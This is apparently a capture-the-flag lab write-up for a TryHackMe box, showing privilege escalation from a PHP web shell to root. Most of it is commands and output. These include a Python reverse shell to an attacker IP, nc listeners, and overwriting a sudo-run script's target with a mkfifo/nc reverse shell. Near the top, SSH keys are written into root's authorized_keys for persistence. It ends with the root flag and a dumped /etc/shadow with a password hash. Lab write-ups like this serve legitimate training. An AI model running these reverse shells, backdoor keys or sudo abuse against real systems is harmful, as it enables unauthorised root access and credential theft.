### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys

User
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCGkKt7Uxk9gOWwzePoJxk7RH40Swh3QUM5VJE0z7FybExcU+KfNTmjLYBCfnaVtNB5Zxm7+xH/iMVudzyAcV5ExWMv5Bz8hawWlE/iLoUCkrtCvyyF71L6/v2mWRSswF6lwDllVZpfG/xGlMoVF9xmOmA2i6+S5Ag9P1TOkIYIJc4Q0jV6CQ6ASYVA5+Oqb4AewyIZsMdoUN65IbU7zSxDcWHVckNjqRzw9nsPCgy07GjIhY3pOg3lTiAXmQ/AuPulNMVDNx+a9nYNH/NZzU2qXy4B44OrCjG4bthEcDCv12R62nBhLjsktjhT1BqdhjYY/UcnwSayt2/wP6ekCCW/sGXtT0LAGS/SlVDKP7Wja5etD57Axv+eU8zihG5j79Nmb8PYCsODWUIIXQRZPnhm/Vi68IC4TKdS5ErB63q/C5Z8Q9jHcLycsACt1v6i458J4Xq5PXFA4yFqyABH824nu+WiKTA02QNQlCIO6Qs8akpFviQh0d8m3WmLLYwxry834AbYh2IKpio6E9aGETqfxbJuVGGgIe81j+rNto4700ASBIlPDrWBv80E0C7fmuzcKCpFBFrYxBxU2MF626mpfsKJcunKi5TeBEN8NiH3PhaYVg+BDS8HM2dZYehiFHi+QHn7T/BCscytWw0lYnqhjFsQ77AxZZPM3GuR6ooOHw== your_email@example.com

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC6mds5K4XhABA7euVnarhW23icWjM6boqk2Sz13cFQg74RxaI4ER/ANczG/UwWpNPl3JTl5KCfY/1GCCdX6JD7JNaNWAKSRV+nFmAnfB6OFog3/QlXS8hDOm568QHJlVGQ1FQRrhNOjGX7kSPGupEDgNth97a4vWUOvv7pF8TKtvx4Dqp1iTtEVRo+T2Nxa+NBrX9gfLrOI/wdcRU9GtonGelE4Mo2u85fzym7lNc2HEVAnJT2eTHT+Ozh00YdSX+CHtleN43MacthzxrfYdCRE59/4BW1Un9td6qh3uLpqfK9Y2Qsb8KIf4q2qgoiLdR/Zjr320xfUv1t+xbDIRXloAnbt9ubvH1PhIdCVwOZcQ4qVb5wr2r9Qoi+fM5o1/B5h04MKJSeBxDyFsEuckBP+84gfNRgo2DuyiHqyBJ24QVPGLh9S3Rg4hLKI5/+cjTPqEhnoyiYW51VlibcHQnjsJvX+2PLGw16SJoQO07P3TOGgmfJC1uy90qkaGH832BuGEHUsC0DLW0fgM6pX705RVnf6d1PsIBxNx4zjlE2Z3pbcHIcxK4uRXjHJrgp1Ip2Q1h3hB58yv/8ccAA6sHO6iqo1mvuV/Ltx4JafXLdNG9Mce+9j3EEn53MOlzHbhWllf7fJge8ASDV8SOpgWTXVqMv+ZnsvlpNHJya9HeYwQ== your_email@example.com" > /root/.ssh/authorized_keys

```

checking for sudo permissions in our php bash shell

```
www-data@THM-Chal

:/var/www/html/content/inc/ads# sudo -l
```

```
  
Matching Defaults entries for www-data on THM-Chal:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User www-data may run the following commands on THM-Chal:  
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

we can run a perl script from the user "itguy" directory with sudo permissions

that perlscript is owned by root

```
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
```

we are still in phpbash, but we can run a python reverse shell and try upgrading it to a tty session

the reverse shell code:

```
export RHOST="10.6.18.190";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

start a listener on the attacker machine

```
nc -lvnp 1337
```

copy and paste the reverse shell  code into php bash and enter

```
listening on [any] 1337 ...
connect to [10.6.18.190] from (UNKNOWN) [10.10.195.175] 35482
www-data@THM-Chal:/var/www/html/content/inc/ads$ whoami
whoami
www-data
www-data@THM-Chal:/var/www/html/content/inc/ads$ uname -a
uname -a
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
www-data@THM-Chal:/var/www/html/content/inc/ads$ 
```

contents of backup.pl

```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

so the perl script runs a bash script at /etc/copy.sh.

the copy.sh is a reverse shell itself

we modify the ip and port in the the reverse shell command to direct back to our attacker machine  

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.18.190 1338 >/tmp/f" > /etc/copy.sh
```

start a new listener on attacker machine in a separate terminal

```
nc -lvnp 1338
```

in the first reverse shell, run the perl script with sudo privileges

```
sudo perl /home/itguy/backup.pl
```

we see a hit on our second reverse shell

```
listening on [any] 1338 ...
connect to [10.6.18.190] from (UNKNOWN) [10.10.195.175] 39480
# whoami
root
# uname -a
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
# sudo -l
Matching Defaults entries for root on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on THM-Chal:
    (ALL : ALL) ALL
# 
```

and we have a root shell

root.txt
```
THM{6637f41d0177b6f37cb20d775124699f}
```


```
root:!:18228:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:17954:0:99999:7:::
uuidd:*:17954:0:99999:7:::
lightdm:*:17954:0:99999:7:::
whoopsie:*:17954:0:99999:7:::
avahi-autoipd:*:17954:0:99999:7:::
avahi:*:17954:0:99999:7:::
dnsmasq:*:17954:0:99999:7:::
colord:*:17954:0:99999:7:::
speech-dispatcher:!:17954:0:99999:7:::
hplip:*:17954:0:99999:7:::
kernoops:*:17954:0:99999:7:::
pulse:*:17954:0:99999:7:::
rtkit:*:17954:0:99999:7:::
saned:*:17954:0:99999:7:::
usbmux:*:17954:0:99999:7:::
itguy:$6$lEFmSzBi$M/BzAIH6sOmfmItrGxeLHdyrhb08KQyx8o0fDAytD2Xu9YKbZyYYqYXtnn0nnQrLRMed8GKJbvA.RwGM9HU3y0:18228:0:99999:7:::
mysql:!:18229:0:99999:7:::
vboxadd:!:18229::::::
guest-3myc2b:!:18229::::::
sshd:*:18229:0:99999:7:::
```